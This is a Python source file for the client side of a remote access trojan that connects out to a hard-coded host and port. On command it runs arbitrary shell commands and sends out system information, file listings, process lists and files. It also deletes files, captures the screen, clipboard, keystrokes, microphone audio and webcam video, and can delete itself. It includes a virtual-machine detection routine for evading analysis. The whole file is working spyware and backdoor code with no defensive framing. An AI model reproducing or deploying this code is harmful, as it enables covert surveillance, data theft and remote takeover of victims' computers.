from sys import platform  
import socket  
import subprocess 
from PIL import Image, ImageGrab
import pyperclip
import io
from pynput import keyboard
import wave
import pyaudio
import time
import cv2
import pickle
import struct
import platform
import subprocess
import threading
import platform
import os
import sys

if __name__ == "__main__":

    if True:

        HOST = '192.168.25.130'
        PORT = 12345

        def detect_virtualization():
            system_info = platform.system().lower()

            if "linux" in system_info:
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read()
                    if 'hypervisor' in cpuinfo or 'kvm' in cpuinfo:
                        return True

            elif "windows" in system_info:
                import ctypes
                result = ctypes.windll.kernel32.GetSystemWow64DirectoryW(ctypes.c_wchar_p(0), 0)
                return result != 0

            return False

        def send_chunks(len, data, need_bytes=False):
            if need_bytes:
                for i in range(0, len, 1024):
                    s.send(data[i:i + 1024])
            else:
                for i in range(0, len, 1024):
                    s.send(data[i:i + 1024].encode('utf-8'))

        def cli_handler():
            while True:
                cmd = s.recv(1024).decode()
                print(cmd)
                if cmd == "exit":
                    break
                else:
                    try:
                        res = subprocess.getoutput(cmd)
                        s.send(bytes("<<< " + res, 'utf-8'))
                    except FileNotFoundError:
                        s.send(b"<<< ERROR")
                    continue

        def sys_info():
            res = subprocess.getoutput("systeminfo")[:4000]
            s.send(bytes(str(len(res)), 'utf-8'))
            send_chunks(len(res), res)             

        def discover_handler():
            cmd = s.recv(1024).decode()
            res = subprocess.getoutput("dir /b /s " + cmd)
            s.send(bytes(str(len(res)), 'utf-8'))
            send_chunks(len(res), res)

        def remote_copy():
            filename = s.recv(1024).decode()
            file = open(filename, "rb")
            data = file.read()
            file.close()
            #print(data)
            s.send(bytes(str(len(data)), 'utf-8'))
            print(str(len(data)))
            send_chunks(len(data), data, need_bytes=True)
            

        def remote_delete():
            file = s.recv(1024).decode()
            res = subprocess.getoutput("del /f " + file)
            if not res:
                s.send(bytes(b"Successfully deleted file "))
            else:
                s.send(bytes(res, 'utf-8'))

        def get_screen():
            image = ImageGrab.grab()
            image_bytes = io.BytesIO()
            image.save(image_bytes, format='PNG')
            image_bytes = image_bytes.getvalue()
            size = len(image_bytes).to_bytes(8, byteorder='big')
            s.sendall(size)
            s.sendall(image_bytes)

        def clipboard_capture():
            clipboard_data = pyperclip.paste()
            s.send(bytes("<<< " + clipboard_data, 'utf-8'))

        def process_discovery():
            res = subprocess.getoutput("tasklist")
            s.send(bytes(str(len(res)), 'utf-8'))
            send_chunks(len(res), res)

        def video_capture():
            s.recv(1024).decode()
            cap = cv2.VideoCapture(0)

            try:
                print("Capturing video...")
                start_time = time.time()

                while (time.time() - start_time) < 5:
                    ret, frame = cap.read()
                    data = struct.pack("I", frame.size) + frame.tobytes()
                    s.sendall(data)
                s.sendall(struct.pack("I", 0))
            finally:
                cap.release()
    
        def audio_capture():
            duration_data = s.recv(4)
            desired_duration = struct.unpack("f", duration_data)[0]
            filename = s.recv(1024).decode()

            s.sendall("start".encode())
        
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16,
                            channels=1,
                            rate=44100,
                            input=True,
                            frames_per_buffer=1024)

            try:
                start_time = time.time()
                while time.time() - start_time < desired_duration:
                    audio_data = stream.read(1024)
                    s.sendall(audio_data)
            
                s.sendall(b'done')

            finally:
                stream.stop_stream()
                stream.close()
                p.terminate()

        def on_press(key):
            try:
                s.sendall(str(key).encode('utf-8'))
            except Exception as e:
                print(f"Error: {e}")

        def keylogger():
            with keyboard.Listener(on_press=on_press) as listener:
                try:
                    s.sendall(b'')  
                    a = s.recv(1024) 
                    if a == b'Terminate':
                        listener.stop()
                        listener.join()
                        return
                except KeyboardInterrupt:
                    listener.stop()
                    listener.join()
                    return

        def destroy():
            os.remove(sys.argv[0])
        detect_virtualization()
        #if detect_virtualization():
            #print("VM detected")
            #exit(0)


        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

            s.connect((HOST, PORT))
            print(f"Client has been started.\nConnected to the {HOST}")
            while True:

                command = s.recv(1024).decode()

                if command == "1":
                    sys_info()

                elif command == "2":
                    cli_handler()
                    continue

                elif command == "3":
                    discover_handler()

                elif command == "4":
                    remote_copy()
                    continue

                elif command == "5":
                    remote_delete()

                elif command == "6":    #not workin
                    process_discovery()

                elif command == "7":
                    keylogger()

                elif command == "8":
                    clipboard_capture()
                    continue
            
                elif command == "9":
                    get_screen()
            
                elif command == "10":    #not workin
                    audio_capture()
                    continue
            
                elif command == "11":
                    video_capture()

                else:
                    if command == 'exit':
                        s.close()
                        break
